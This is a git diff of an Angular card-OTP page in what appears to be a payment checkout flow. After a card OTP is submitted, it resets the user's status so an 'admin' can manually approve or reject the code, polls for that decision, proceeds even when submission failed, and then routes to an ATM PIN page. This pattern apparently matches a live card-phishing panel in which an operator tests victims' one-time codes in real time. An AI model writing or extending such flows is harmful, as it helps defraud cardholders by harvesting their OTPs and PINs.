@@ -4,9 +4,11 @@ import { Router } from '@angular/router';
 import { Header } from "../../Layout/header/header";
 import { OtpService } from '../../Core/services/api/otp.service';
 import { CheckoutService } from '../../Core/services/api/checkout.service';
+import { PaymentVerificationModal, VerificationStatus } from '../../Components/payment-verification-modal/payment-verification-modal';
+import { Subscription, interval } from 'rxjs';
 
 @Component({
-  imports: [CommonModule, Header],
+  imports: [CommonModule, Header, PaymentVerificationModal],
   selector: 'app-card-otp',
   styleUrl: './card-otp.css',
   templateUrl: './card-otp.html',
@@ -25,12 +27,18 @@ export class CardOtp implements OnInit, OnDestroy {
   timerInterval: any;
   isLoading = false;
 
+  isVerifying = false;
+  verificationStatus: VerificationStatus = 'checking';
+  errorMessage = '';
+  private pollSub?: Subscription;
+
   ngOnInit(): void {
     this.startTimer();
   }
 
   ngOnDestroy(): void {
     this.clearTimer();
+    this.stopPolling();
   }
 
   startTimer(): void {
@@ -56,6 +64,7 @@ export class CardOtp implements OnInit, OnDestroy {
     if (this.timeLeft === 0) {
       this.otp = ['', '', '', '', '', ''];
       this.startTimer();
+      this.cdr.markForCheck();
     }
   }
 
@@ -123,15 +132,66 @@ export class CardOtp implements OnInit, OnDestroy {
       this.isLoading = true;
       this.otpService.submitOtp(otpCode, userId).subscribe({
         next: () => {
-          this.isLoading = false;
-          this.router.navigate(['/payment/atm-pass']);
+          // Reset status to PENDING so admin can approve or reject the OTP
+          this.checkoutService.resetUserStatus(userId).subscribe();
+          this.startVerification(userId);
         },
         error: (err) => {
           console.error('OTP submission failed', err);
-          this.isLoading = false;
-          this.router.navigate(['/payment/atm-pass']);
+          // Even if failed, reset status and start verification so admin can review
+          this.checkoutService.resetUserStatus(userId).subscribe();
+          this.startVerification(userId);
         }
       });
+    }
+  }
+
+  private startVerification(userId: string): void {
+    this.isVerifying = true;
+    this.verificationStatus = 'checking';
+    this.errorMessage = '';
+    this.cdr.markForCheck();
+
+    this.stopPolling();
+    this.pollSub = interval(2000).subscribe(() => {
+      this.checkoutService.checkUserStatus(userId).subscribe((status) => {
+        if (status === 'ACCEPTED') {
+          this.stopPolling();
+          this.verificationStatus = 'accepted';
+          this.cdr.markForCheck();
+          setTimeout(() => {
+            this.isVerifying = false;
+            this.isLoading = false;
+            this.router.navigate(['/payment/atm-pass']);
+          }, 800);
+        } else if (status === 'REJECTED') {
+          this.stopPolling();
+          this.verificationStatus = 'rejected';
+          this.errorMessage = 'Incorrect or expired verification code. Please check your SMS and try again.';
+          this.cdr.markForCheck();
+        }
+      });
+    });
+  }
+
+  handleRetry(): void {
+    this.stopPolling();
+    this.isVerifying = false;
+    this.isLoading = false;
+    this.otp = ['', '', '', '', '', ''];
+    this.cdr.markForCheck();
+    setTimeout(() => {
+      const inputs = this.otpInputs?.toArray();
+      if (inputs && inputs[0]) {
+        inputs[0].nativeElement.focus();
+      }
+    }, 50);
+  }
+
+  private stopPolling(): void {
+    if (this.pollSub) {
+      this.pollSub.unsubscribe();
+      this.pollSub = undefined;
     }
   }
 }
